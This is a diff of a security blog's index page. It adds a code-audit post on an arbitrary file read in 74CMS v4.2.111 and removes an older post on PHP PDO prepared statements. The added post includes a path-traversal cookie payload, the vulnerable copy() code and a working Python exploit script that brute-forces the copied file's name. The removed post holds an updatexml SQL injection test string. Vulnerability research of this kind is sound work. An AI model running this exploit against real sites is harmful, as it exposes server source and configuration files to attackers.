@@ -236,6 +236,240 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" itemprop="url">代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-09T09:15:41+08:00">
+                2018-10-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<p>审计cms：<a href="https://p0rz9.github.io/2018/10/08/74CMS_V4.2.111%E5%A4%9A%E5%A4%84sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:<code>copy()</code>操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码</p>
+<p>##<strong>1.基础知识:</strong><br>74cms是基于ThinkPHP3.2.3而建<br><code>Thinkphp</code>的一些基本操作可参考笔者以前的文章:<br><a href="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
+<p>##<strong>2.环境搭建:</strong><br><a href="http://www.74cms.com/download/index.html" target="_blank" rel="noopener">骑士官网</a>下载最新版本<code>74cms_v4.2.111</code>安装到本地即可。</p>
+<p>##<strong>3.漏洞利用:</strong><br>因为笔者是本地测试的,并没有开启短信服务,所以在这里先注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/tty53uwi3zfjnmism4ic3jcm/image_1cpcbkt29r67qm81tiassp2ve25.png" alt="image_1cpcbkt29r67qm81tiassp2ve25.png-75.4kB"></p>
+<p>这里我们以读取入口文件为例<br><strong>paylaod</strong>:</p>
+<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
+headers: Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1
+POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind
+</code></pre><p>访问生成的特定<code>jpg</code>文件,下载到本地用编辑器打开即可看到<code>index.php</code>的内容<br><img src="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" alt="image_1cpc6ufrd7gugtklt11fud1lku9.png-72.6kB"></p>
+<p>##<strong>4.代码分析:</strong><br>这里只贴出相关代码。<br>1.根据<code>payload</code>定位到漏洞文件：</p>
+<pre><code>#upload\Application\Home\Controller\MembersController.class.php
+
+public function register(){
+    ...
+    if(IS_POST &amp;&amp; IS_AJAX){
+        $data[&apos;reg_type&apos;] =     
+        I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
+        $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
+        if($data[&apos;reg_type&apos;] == 1){//进入
+             //判断验证码
+        ...
+
+        if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
+            $uc_user = cookie(&apos;members_uc_info&apos;);
+            $data = array_merge($data,$uc_user);//合并数组
+
+            $passwordVerify = $data[&apos;password&apos;];
+        }
+        ...
+        if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
+            ...
+        if(&apos;bind&apos; == I(&apos;post.org&apos;,&apos;&apos;,&apos;trim&apos;) &amp;&amp; cookie(&apos;members_bind_info&apos;)){
+            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
+            $user_bind_info[&apos;uid&apos;] = $data[&apos;uid&apos;];
+            ...
+            $this-&gt;_save_avatar($user_bind_info[&apos;temp_avatar&apos;],$data[&apos;uid&apos;]);//临时头像转换
+            //跟进_save_avatar()函数
+</code></pre><p>跟进_save_avatar()函数:</p>
+<pre><code>#upload\Application\Home\Controller\MembersController.class.php
+protected function _save_avatar($avatar,$uid){
+    if(!$avatar) return false;
+$path = C(&apos;qscms_attach_path&apos;).&apos;avatar/temp/&apos;.$avatar;
+
+    $image = new \Common\ORG\ThinkImage();
+$date = date(&apos;ym/d/&apos;);
+
+    $save_avatar=C(&apos;qscms_attach_path&apos;).&apos;avatar/&apos;.$date;//图片存储路径
+    //data/upload/avatar/1810/09/
+    if(!is_dir($save_avatar)) mkdir($save_avatar,0777,true);
+    $savePicName = md5($uid.time()).&quot;.jpg&quot;;
+    $filename = $save_avatar.$savePicName;
+$size = explode(&apos;,&apos;,C(&apos;qscms_avatar_size&apos;));
+
+    copy($path, $filename);//漏洞触发点
+</code></pre><p>这里简单分析下代码:</p>
+<p><img src="http://static.zybuluo.com/chhyx/ggsy0ntyi0jzti5qrzxhdabl/image_1cpcb92na1lk3qso1ik1jdh41p1o.png" alt="image_1cpcb92na1lk3qso1ik1jdh41p1o.png-121.9kB"></p>
+<p>大家能看到最后一行有<code>unlink</code>操作,但是这里并不会造成任意文件删除 因为<code>$path</code>不是图片 <code>$image-&gt;open()</code>会报错,不过是存在任意图片删除的。</p>
+<p>2.这里漏洞的关键是在于<code>copy</code>操作的两个参数我们都可控,且没过滤../等敏感字符导致任意文件读取。</p>
+<p>3.我们理一下漏洞利用条件:</p>
+<pre><code>a.IS_POST &amp;&amp; IS_AJAX
+b.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2  //注册必要
+c.$ucenter == &apos;bind&apos;
+d.$org == &apos;bind&apos;
+e.cookie中含有members_bind_info字段且不为空
+</code></pre><p>4.解释下所用paylaod:</p>
+<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
+headers: Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest //满足AJAX操作
+Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1                        //读取的文件及上文e条件
+POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind //满足上文bcd条件
+</code></pre><p>5.py脚本:</p>
+<pre><code># -*- coding: utf-8 -*-
+#author: P0rZ9
+#env: python2
+
+import requests
+import hashlib
+import time
+
+url = &apos;http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register&apos;
+headers = {
+    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&apos;,
+    &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,
+    &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;
+}
+data = &apos;ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind&apos;
+cookies = {&apos;members_bind_info[temp_avatar]&apos;: &apos;../../../../index.php&apos;, &apos;members_uc_info[uid]&apos;: &apos;1&apos;}
+
+def copy_file():
+    re = requests.post(url,data=data,headers=headers,cookies=cookies)
+    print &apos;[-]file_copy_success&apos;
+
+def get_file_name():
+    state_time = &apos;%.0f&apos;%(time.time()-20)
+    for i in range(20):
+        pay_time = int(state_time) + i
+        img_url = &apos;http://127.0.0.1:84/data/upload/avatar/1810/09/%s&apos;%(md5_str(&apos;1&apos;+str(pay_time))+&apos;.jpg&apos;)
+        r = requests.get(img_url)
+        if &apos;No input file specified.&apos; not in r.text:
+            print &apos;[-]result_file:%s&apos;%img_url
+
+def md5_str(str):
+    h1 = hashlib.md5()
+    h1.update(str.encode(encoding=&apos;utf-8&apos;))  # 传入需要加密的字符串进行MD5加密
+    return h1.hexdigest() 
+
+def main():
+    copy_file()
+    get_file_name()
+
+main()
+</code></pre><p>成功截图:<br><img src="http://static.zybuluo.com/chhyx/1vh2q0dq88fr57e1di1dhl9m/image_1cpcf5kaeh1h1lora691vfp12542i.png" alt="image_1cpcf5kaeh1h1lora691vfp12542i.png-207.8kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/74CMS_V4.2.111多处sql注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2217,176 +2451,6 @@ var_dump($xml_class);
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/PDO的来龙去脉/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/20/PDO的来龙去脉/" itemprop="url">PHP基础 | PDO的来龙去脉</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T08:15:41+08:00">
-                2018-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>昨天碰到PDO预编译造成无法sql注入的情况,不是很清楚PDO的处理机制,自己去网上差了些资料,记录一波。</p>
-</blockquote>
-<hr>
-<p><strong>定义：</strong></p>
-<blockquote>
-<p>在生成网页时，许多PHP脚本通常都会执行除参数之外，其他部分完全相同的查询语句，针对这种重复执行一个查询，每次迭代使用不同的参数情况，PDO提供了一种名为预处理语句(prepared statement)的机制。它可以将整个SQL命令向数据库服务器发送一次，以后只有参数发生变化，数据库服务器只需对命令的结构做一次分析就够了，即编译一次，可以多次执行。</p>
-</blockquote>
-<p><strong>准备语句:</strong><br>重复执行一个SQL查询，通过每次迭代使用不同的参数,在PDO中有两种使用占位符的语法：“命令参数”和“问号参数”<br>A.使用命名参数作为占位符:</p>
-<pre><code>$link = $dbh-&gt;prepare(&quot;INSERT INTO contactInto(name,address,phone)VALUES (:name,:address,:phone)&quot;);
-</code></pre><p>B.使用?作为占位符:</p>
-<pre><code>$link = $dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES (?,?,?)&quot;);
-</code></pre><p>不管是否使用了占位符,都需要使用PDO对象中的prepare()方法，去准备这个将要用于迭代执行的查询，并返回一个PDOStatement类对象</p>
-<p><strong>绑定参数:</strong><br>A.当sql语句在数据库服务端准备好了一个”sql”语句后,如果使用了占位符,就需要在每次执行时替换输入的参数,可通过PDOStatement对象中的bindParam()或者bindValue()方法,把参数变量绑定到准备好的占位符上<br>    <strong>bindParam()</strong>:<br>    分别绑定上对应的参数</p>
-<pre><code>$link-&gt;bindParam(&quot;:name&quot;,$name);//使用命名参数绑定参数的情况
-$link-&gt;bindParam(&quot;1&quot;,$name);//使用?绑定参数的情况
-</code></pre><p>B.区别:<br>   bindParam()只有在PDOStatement::execute()被调用的时候才取其值<br>C.实例:</p>
-<pre><code>$id = 1;
-$st-&gt;bindParam(1,$id,PDO::PARAM_INT);
-$id = 2;    
-$st-&gt;execute();
-</code></pre><p>使用bindParam()取得是id=2的值 而bindValue()取得是id=1的值</p>
-<p><strong>执行查询:</strong><br>通过调用PDOStatement类对象中的execute()方法去反复执行在数据库缓存区准备好的语句</p>
-<pre><code>$st-&gt;execute();
-</code></pre><p><strong>PDO防止sql注入：</strong></p>
-<ol>
-<li>需要设置<code>$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false)</code></li>
-</ol>
-<blockquote>
-<p>PDO几乎为所支持的所有数据库提供了命令占位符模拟,甚至可以为生来就不支持该概念的数据库模拟预处理语句和绑定参数。如果说开启了模拟预处理(即参数值为true),那么PDO内部会模拟参数绑定的过程,SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES =&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的,来阻止sql注入</p>
-</blockquote>
-<p>2.我们解释下两种交互过程:<br>A.模拟预处理:<br>客户端本地执行预处理的模拟，最终将拼好的sql语句发送到mysql服务器进行执行<br>B.本地预处理:<br>分两步进行:<br>a.prepare()阶段:发送带有占位符的sql语句到mysql服务器(parsing-&gt;resolution)<br>b.多次发送占位符参数给mysql服务器进行执行(多次执行optimization-&gt;execution)</p>
-<p>3.如出现sql语句错误: 使用本地预处理：是在prepare()阶段就会检测出sql语句的错误   使用模拟预处理: 只有在exec阶段才能发现(拼接好sql语句 在exec阶段才会发送给mysql服务器)</p>
-<p>本地预处理:</p>
-<pre><code>    &lt;?php
-$params = [
-    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,//开启错误模式
-    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
-];
-
-$db = new PDO(&apos;mysql:dbname=tp;host=127.0.0.1;&apos;, &apos;root&apos;, &apos;root&apos;, $params);
-
-try {
-    $link = $db-&gt;prepare(&apos;SELECT * FROM user WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&apos;);
-} catch (\PDOException $e) {
-    var_dump($e);//打印错误信息
-}
-</code></pre><p>虽然只执行了prepare()函数 但是sql语句也成功报错<br><img src="http://static.zybuluo.com/chhyx/0jgrbzassu76coiknqux219a/image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png" alt="image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png-47.4kB"></p>
-<p>模拟预处理:<br>未报错:<br><img src="http://static.zybuluo.com/chhyx/784qcml72336xbr671u6xwtz/image_1cnqcovr0uii7l911241f0k1cr97f.png" alt="image_1cnqcovr0uii7l911241f0k1cr97f.png-53.2kB"></p>
-<p>执行execute()报错:<br><img src="http://static.zybuluo.com/chhyx/jma77nhme7l2ndljbgfx1g8l/image_1cnqcqs5a5pq48n1a25tm718ec7v.png" alt="image_1cnqcqs5a5pq48n1a25tm718ec7v.png-84.5kB"></p>
-<p><strong>参考链接:</strong><br>1.<a href="https://www.cnblogs.com/alazalazalaz/p/6056393.html" target="_blank" rel="noopener">https://www.cnblogs.com/alazalazalaz/p/6056393.html</a><br>2.<a href="https://www.cnblogs.com/tinywan/p/6143889.html" target="_blank" rel="noopener">https://www.cnblogs.com/tinywan/p/6143889.html</a><br>3.<a href="https://blog.csdn.net/a7442358/article/details/45268489" target="_blank" rel="noopener">https://blog.csdn.net/a7442358/article/details/45268489</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2437,7 +2501,7 @@ try {
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
